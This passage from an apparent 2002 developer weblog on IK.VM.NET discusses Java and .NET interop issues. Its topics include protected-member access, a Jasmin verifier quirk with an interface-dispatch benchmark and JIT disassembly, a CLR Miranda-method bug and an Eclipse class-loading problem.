		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=73">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a72"></a><div class="entry">
	<h3 class="entryTitle">protected</h3>
	<div class="entryBody">
		<P>Interesting <A href="http://discuss.develop.com/archives/wa.exe?A2=ind0212b&amp;L=advanced-dotnet&amp;D=1&amp;T=0&amp;P=4997">post</A> by Chris Daly on the <A href="http://discuss.develop.com/advanced-dotnet.html">advanced-dotnet</A> list today. He questions the C# language spec, which says that the following is illegal:</P><PRE>public class A<BR>{<BR> protected int x;<BR>}</PRE><PRE>public class B: A<BR>{<BR> static void F(A a, B b) {<BR> a.x = 1; &#47;/ Error, must access through instance of B<BR> b.x = 1; &#47;/ Ok<BR> }<BR>}&nbsp;</PRE>
<P>The equivalent Java is legal. When I statically compile the Java equivalent of&nbsp;A and B into two different assemblies, to resulting B.dll is unverifiable. It's not just a C# language issue, the CLR restricts access to protected members in this way. When both types are compiled into the same assembly there is no problem, because <EM>protected</EM>&nbsp;is compiled as <EM>famorassem</EM> so any type in the assembly already has access (this is needed because protected also implies package access, which has no CLR equivalent).</P>
<P>I wonder if a work around is required.</P>
<P><STRONG>UPDATE: </STRONG>I wasn't quite awake yet. Of course, the reason that the above code works in Java is because protected implies package access, it has nothing to do with the protectness of the field. When&nbsp;you move&nbsp;A and B into different packages, javac fails with the same error as the C# compiler.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/13/2002 14:32:21 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=72"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=72">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 10 December 2002</h2></div>
<div class="newsItems"><a name="a71"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		I did some debugging last night to try and figure out where the random NullReferenceExceptions come from when running the SWT samples. I couldn't pinpoint anything (adding Console.WriteLines completely changed the behavior :-(), but when I tried running the exe under the 1.1 beta CLR the problem didn't occur, so naturally, now I'm beginning to wonder whether it is actually caused by a CLR bug...
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/10/2002 16:25:19 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=71"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=71">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 06 December 2002</h2></div>
<div class="newsItems"><a name="a70"></a><div class="entry">
	<h3 class="entryTitle">Bonaire</h3>
	<div class="entryBody">
		<P>I'm off to Bonaire until the 17th, so there probably won't be any updates before then.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/06/2002 08:34:09 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=70"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=70">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 03 December 2002</h2></div>
<div class="newsItems"><a name="a69"></a><div class="entry">
	<h3 class="entryTitle">SWT</h3>
	<div class="entryBody">
		<P>I've been working on getting the SWT (the <A href="http://www.eclipse.org/">Eclipse</A> windowing toolkit) examples to run. This mostly involved implementing a lot of JNI methods.</P>
<P>The examples now run, but they do run into the occasional random NullPointerException. Probably caused by a sneaky bug in the (un)managed C++ code.</P>
<P><A href="http://www.frijters.net/swt1.zip">Here</A> is a statically compiled version ControlExample (including all the supporting DLLs needed).</P>
<P>Note that this will only run on Windows, because my JNI implementation is written in Managed C++ it will not run on Mono.</P>
<P>Some interesting findings:</P>
<UL>
<LI>SWT has a reference to the <EM>sun.awt.windows.WEmbeddedFrame</EM> class. What's that about?</LI>
<LI>In order to get the FileViewer example to run, I had to use the STAThread attribute on my main method. Boy I'm I glad I missed the whole COM thing (was busy doing Java). This just too lame.</LI>
<LI>Reflection.Emit does not support embedding resources in a module (lame!). I had to add resource support to ikvmc (and the VM)&nbsp;to get ControlExample to work, statically compiled, so I added initialized global public fields to the assembly and used <A href="http://msdn.microsoft.com/library/en-us/cpref/html/frlrfSystemRuntimeCompilerServicesRuntimeHelpersClassInitializeArrayTopic.asp?frame=true">System.Runtime.CompilerServices.RuntimeHelpers.InitializeArray</A> to copy the field data to an array.</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/03/2002 09:32:32 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=69"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=69">Comments [10]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 30 November 2002</h2></div>
<div class="newsItems"><a name="a68"></a><div class="entry">
	<h3 class="entryTitle">Interfaces & the Verifier</h3>
	<div class="entryBody">
		<P>To my surprise to following code (Jasmin source)&nbsp;is verifiable and runs without throwing any exceptions (Sun's JRE 1.4.1):</P><PRE>.class public ifmerge3<BR>.super java/lang/Object</PRE><PRE>.field public static r Ljava/lang/Runnable;</PRE><PRE>.method public &lt;init&gt;()V<BR>&nbsp;&nbsp; .limit locals 2<BR>&nbsp;&nbsp; .limit stack 8<BR>&nbsp;&nbsp; aload_0<BR>&nbsp;&nbsp; invokenonvirtual java/lang/Object/&lt;init&gt;()V<BR>&nbsp;&nbsp; return<BR>.end method</PRE><PRE>.method public static main([Ljava/lang/String;)V<BR>&nbsp;&nbsp; .limit stack 5<BR>&nbsp;&nbsp; .limit locals 4<BR><FONT color=red>&nbsp;&nbsp; ldc ""<BR>&nbsp;&nbsp; putstatic ifmerge3/r Ljava/lang/Runnable;<BR></FONT>&nbsp;&nbsp; return<BR>.end method</PRE>
<P>The red lines are the interesting ones. It is apparantly (the vmspec doesn't really talk about this) legal to&nbsp;use any object reference in any place where an interface reference is expected.</P>
<P>This has an&nbsp;interesting implication for the performance of interfaces in Java. It means that whenever an interface method is invoked, the VM will always need to check if the reference does in fact implement the interface in question. This should make interface invocation slower. To test this theory, I wrote a small benchmark:</P><FONT color=#0000ff size=2>
<P><FONT face="Courier, Monospace">class</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> ifperf </FONT><FONT color=#0000ff size=2>implements</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> Runnable {<BR></FONT><FONT color=#0000ff size=2>&nbsp; public</FONT><FONT size=2> </FONT><FONT color=#0000ff size=2>void</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> run() {}<BR></FONT><FONT color=#0000ff size=2>&nbsp; public</FONT><FONT size=2> </FONT><FONT color=#0000ff size=2>static</FONT><FONT size=2> </FONT><FONT color=#0000ff size=2>void</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; Runnable r = </FONT><FONT color=#0000ff size=2>new</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> ifperf();<BR>&nbsp;&nbsp;&nbsp; Runnable[] ar = </FONT><FONT color=#0000ff size=2>new</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> Runnable[10000];<BR></FONT><FONT color=#0000ff size=2>&nbsp;&nbsp;&nbsp; for</FONT><FONT size=2>(</FONT><FONT color=#0000ff size=2>int</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> i = 0; i &lt; ar.length; i++)<BR>&nbsp;&nbsp;&nbsp; &nbsp; ar[i] = r;<BR></FONT><FONT color=#0000ff size=2>&nbsp;&nbsp;&nbsp; long</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> start = System.currentTimeMillis();<BR></FONT><FONT color=#0000ff size=2>&nbsp;&nbsp;&nbsp; for</FONT><FONT size=2>(</FONT><FONT color=#0000ff size=2>int</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> i = 0; i &lt; 1000; i++)<BR></FONT><FONT color=#0000ff size=2>&nbsp;&nbsp; &nbsp; &nbsp;for</FONT><FONT size=2>(</FONT><FONT color=#0000ff size=2>int</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> j = 0; j &lt; ar.length; j++)<BR>&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; ar[j].run();<BR></FONT><FONT color=#0000ff size=2>&nbsp;&nbsp; &nbsp;long</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> end = System.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; System.out.println(end - start);<BR>&nbsp; }<BR>}</FONT></P></FONT>
<P>Sun's J2RE 1.4.1: 300 ms<BR>IKVM (on .NET 1.1 beta): 150 ms</P>
<P><A href="http://www.iunknown.com/">John Lam</A> has written about the implementation of .NET's interface method dispatch <A href="http://www.iunknown.com/Articles/fog0000000082.html">here</A>. I haven't been able to find any articles that talk about HotSpot's implementation of interface method dispatch. Let's look at the&nbsp;code that is generated by both JITs.</P>
<P>.NET 1.1 beta code (inner loop only):</P><PRE>07591DCC&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edi,dword ptr [esi+4] <BR>07591DCF&nbsp; jl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 07591DD4 <BR>07591DD1&nbsp; inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx&nbsp; <BR>07591DD2&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 07591D91 <BR>07591DD4&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edi,dword ptr [esi+4] <BR>07591DD7&nbsp; jae&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 07591DED <BR>07591DD9&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,dword ptr [esi+edi*4+0Ch] <BR>07591DDD&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,dword ptr [ecx] <BR>07591DDF&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,dword ptr [eax+0Ch] <BR>07591DE2&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,dword ptr [eax+94h] <BR>07591DE8&nbsp; call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dword ptr [eax] <BR>07591DEA&nbsp; inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edi&nbsp; <BR>07591DEB&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 07591DCC </PRE><PRE>07591E80&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR></PRE>
<P>J2RE 1.4.1 HotSpot code (inner loop only):</P><PRE>00AC7023&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi,dword ptr [ebp-18h] <BR>00AC7026&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edi,dword ptr [ebp-0Ch] <BR>00AC7029&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edi,dword ptr [esi+8] <BR>00AC702C&nbsp; jae&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00AC7146 <BR>00AC7032&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi,dword ptr [esi+edi*4+0Ch] <BR>00AC7036&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dword ptr [esp],esi <BR>00AC7039&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,esi <BR>00AC703B&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,dword ptr [ecx] <BR>00AC703D&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,6B68778h <BR>00AC7042&nbsp; call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00ABCE25 <BR>00AC7047&nbsp; inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dword ptr [ebp-0Ch] <BR>00AC704A&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi,dword ptr [ebp-18h] <BR>00AC704D&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi,dword ptr [esi+8] <BR>00AC7050&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edi,dword ptr [ebp-0Ch] <BR>00AC7053&nbsp; es:<BR>00AC7054&nbsp; cs:<BR>00AC7055&nbsp; fs:<BR>00AC7056&nbsp; gs:<BR>00AC7057&nbsp; nop<BR>00AC7058&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edi,esi <BR>00AC705A&nbsp; jl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00AC7023 </PRE><PRE>00ABCE25&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx,dword ptr [eax+0Ch] <BR>00ABCE28&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx,dword ptr [eax+8] <BR>00ABCE2B&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx,dword ptr [ecx+4] <BR>00ABCE2E&nbsp; jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00ABB6C0 <BR>00ABCE34&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dword ptr [ebx+38h],0 <BR>00ABCE3B&nbsp; jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00ABB8C0 <BR>00ABCE41&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00A67940 </PRE><PRE>00A67940&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR></PRE>
<P>The first thing to notice, is that HotSpot (in this particular example) is not very good at optimizing register usage, compared&nbsp;to the&nbsp;.NET JIT. .NET uses EDI as the loop counter and ESI as the array reference, whereas HotSpot&nbsp;keeps both&nbsp;the counter and the array reference on the stack. This difference probably accounts for a large part of the performance difference.</P>
<P>The second thing to notice, is that both HotSpot and .NET do <STRONG>not </STRONG>eliminate the array bounds check (again, in this particular example).</P>
<P>The code at 00ABCE25 is where it gets really interesting. After running a while, HotSpot noticed that all calls to Runnable.run() at this site actually resolved to ifperf.run() and so it emitted code that takes advantage of that fact. However, since it cannot prove that&nbsp;this will always be true, it has generated code that checks that&nbsp;the reference does indeed refer to an ifperf object (the cmp instruction at 00ABCE2B does this), and if it doesn't, it jumps to some code at 00ABB6C0 to do the interface method lookup <STRONG>and </STRONG>patch the call at 00AC7042 to point to a new location that does the interface method lookup and does the profiling that started this optimization in the first place. I'm not sure what the second comparison does, but it's something similar. The final branch at 00ABCE41 jumps to the ifperf.run() implementation (bypassing any dynamic dispatch!).</P>
<P>Conclusions: All of this complex optimization (and on-the-fly deoptimization!) makes micro benchmarking fairly useless (as many others have previously demonstrated). As an example, storing just a single&nbsp;non ifperf Runnable in the array slows HotSpot down by about 10%, while in .NET this has no effect. However, interleaving two different Runnable object types in the array slows HotSpot down by about 20% whereas it slows down .NET by about 300% (and I cannot explain that).</P>
<P>Now, the real question is, does IK.VM.NET need to support assigning object references (that do not implement a particular interface) to references of that interface type? The current&nbsp;design (although&nbsp;the implementation isn't quite correct)&nbsp;is to allow the&nbsp;code above to be verified, but when it runs it throws an <EM>IncompatibleClassChangeError</EM> when the <EM>putstatic</EM> is executed.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/30/2002 14:20:15 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=68"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=68">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 25 November 2002</h2></div>
<div class="newsItems"><a name="a67"></a><div class="entry">
	<h3 class="entryTitle">More Miranda</h3>
	<div class="entryBody">
		<P>The <EM>System.TypeLoadException</EM> I mentioned <A href="http://weblog.ikvm.net/PermaLink.aspx/65">here</A> turns out to be caused by a bug in the .NET 1.0 CLR (MS has&nbsp;already fixed it in the current 1.1 beta).</P>
<P>Here is some code that triggers it:</P><PRE><FONT color=blue>interface</FONT> __Shape<BR>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=blue>public abstract </FONT>__Rectangle getBounds();<BR>&nbsp;&nbsp;&nbsp; <FONT color=blue>public abstract </FONT>__Rectangle2D getBounds2D();<BR>}</PRE><PRE><FONT color=blue>abstract class </FONT>__RectangularShape <FONT color=blue>implements</FONT> __Shape<BR>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=blue>public</FONT> __Rectangle getBounds()<BR>&nbsp;&nbsp;&nbsp; {<BR>        <FONT color=blue>return null</FONT>;<BR>&nbsp;&nbsp;&nbsp; }<BR>}</PRE><PRE><FONT color=blue>abstract class </FONT>__Rectangle2D <FONT color=blue>extends </FONT>__RectangularShape<BR>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=blue>public</FONT> __Rectangle2D getBounds2D()<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=blue>return null</FONT>;<BR>&nbsp;&nbsp;&nbsp; }<BR>}</PRE><PRE><FONT color=blue>class </FONT>__Rectangle <FONT color=blue>extends</FONT> __Rectangle2D <FONT color=blue>implements</FONT> __Shape<BR>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=blue>public</FONT> __Rectangle getBounds()<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=blue>return null</FONT>;<BR>&nbsp;&nbsp;&nbsp; }</PRE><PRE>&nbsp;&nbsp;&nbsp; <FONT color=blue>public</FONT> __Rectangle2D getBounds2D()<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=blue>return null</FONT>;<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR></PRE>
<P>If this code was compiled with Jikes 1.18 (which doesn't emit Miranda methods) and then run in IK.VM.NET, it failed with a <EM>System.TypeLoadException</EM>. The fix was easy, just emit an abstract method for each interface method that a type doesn't implement. A compiled DLL of the above code can be found <A href="http://www.frijters.net/miranda.dll">here</A>. When run through <EM>peverify</EM> 1.0, it will fail verification, in 1.1 this is fixed.</P>
<P>I compiled the Classpath code I got on Friday with Jikes 1.18 and made a new release based on that (including, of course, all the VM fixes I had to do).</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/25/2002 10:05:05 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=67"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=67">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 23 November 2002</h2></div>
<div class="newsItems"><a name="a66"></a><div class="entry">
	<h3 class="entryTitle">Eclipse</h3>
	<div class="entryBody">
		<P>For the time being I switched back to jikes 1.15. When trying to start Eclipse (M2), it failed with a ClassNotFoundException: org.xml.sax.InputSource.</P>
<P>It turns out that in&nbsp;<EM>org.eclipse.core.internal.runtime.InternalPlatform</EM> the following method causes&nbsp;a problem:</P><FONT color=#0000ff size=2>
<P><FONT face="Courier, Monospace" size=1>public</FONT></FONT><FONT size=1><FONT face="Courier, Monospace"> <FONT color=#0000ff>synchronized</FONT> <FONT color=#0000ff>static<BR></FONT>PluginRegistryModel parsePlugins(URL[] pluginPath,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT size=1><FONT face="Courier, Monospace">&nbsp;Factory factory,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<FONT color=#0000ff>boolean</FONT></FONT><FONT face="Courier, Monospace"> debug) {<BR></FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>/&#47; If the platform is not running then simply parse the<BR>/&#47;</FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>&nbsp;registry.<BR>/&#47;</FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>&nbsp;We don't need to play</FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>&nbsp;any funny class loader games as<BR>/&#47;</FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>&nbsp;we</FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>&nbsp;assume the XML classes are on the class path<BR></FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>/&#47; This happens when we are running this code as part of<BR>/&#47; a</FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>&nbsp;utility (as opposed to starting</FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1> or inside the<BR>/&#47; platform).</FONT></P></FONT>
<P><FONT size=1><FONT face="Courier, Monospace" color=#0000ff>if</FONT><FONT face="Courier, Monospace"> (!(InternalBootLoader.isRunning() ||<BR>&nbsp;&nbsp;&nbsp; &nbsp;InternalBootLoader.isStarting()))<BR></FONT></FONT><FONT size=1><FONT face="Courier, Monospace" color=#0000ff>&nbsp; return</FONT><FONT face="Courier, Monospace"> RegistryLoader.parseRegistry(pluginPath,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;factory,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;debug);</FONT></FONT></P>
<P><FONT color=#008000><FONT face="Courier, Monospace" size=1>/&#47; If we are running the platform, we want to conserve<BR>/&#47; class loaders. <BR></FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>/&#47; Temporarily install the xml class loader as a<BR>/&#47; prerequisite </FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>of the platform class loader<BR></FONT></FONT><FONT color=#008000><FONT face="Courier, Monospace" size=1>/&#47; This allows us to find the xml classes. Be sure to<BR>/&#47;&nbsp;reset the&nbsp;prerequisites after loading.</FONT></P></FONT>
<P><FONT size=1><STRONG><FONT face="Courier, Monospace">PlatformClassLoader.getDefault().setImports(<BR>&nbsp;&nbsp;</FONT><FONT face="Courier, Monospace" color=#0000ff>new</FONT><FONT face="Courier, Monospace"> DelegatingURLClassLoader[]<BR>&nbsp;&nbsp;&nbsp; { xmlClassLoader });</FONT></STRONG></FONT></P>
<P><FONT size=1><FONT face="Courier, Monospace" color=#0000ff>try</FONT><FONT face="Courier, Monospace"> {<BR></FONT></FONT><FONT size=1><FONT face="Courier, Monospace" color=#0000ff>&nbsp; return</FONT><FONT face="Courier, Monospace"> RegistryLoader.parseRegistry(pluginPath,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;factory,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;debug);<BR></FONT></FONT><FONT size=1><FONT face="Courier, Monospace">} </FONT><FONT face="Courier, Monospace" color=#0000ff>finally</FONT><FONT face="Courier, Monospace"> {<BR>&nbsp; </FONT></FONT><FONT size=1><FONT face="Courier, Monospace">PlatformClassLoader.getDefault().setImports(</FONT><FONT face="Courier, Monospace" color=#0000ff>null</FONT><FONT face="Courier, Monospace">);<BR></FONT></FONT><FONT face="Courier, Monospace" size=1>}<BR></FONT><FONT face="Courier, Monospace" size=1>}</FONT><FONT size=2></P>
<P></FONT>The bold line basically adds the <EM>xerces</EM> plugin to the classpath, this is needed because <EM>RegistryLoader </EM>depends on it. However, in IK.VM.NET the RegistryLoader class gets compiled when the above <EM>parsePlugins</EM> method is JITted by the .NET runtime, and at that moment the xerces code is not yet available.</P>
<P>This is an interesting problem, but&nbsp;I'm not sure if this construction is actually guaranteed to work on all VMs by the spec.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/23/2002 14:19:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=66"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=66">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 22 November 2002</h2></div>
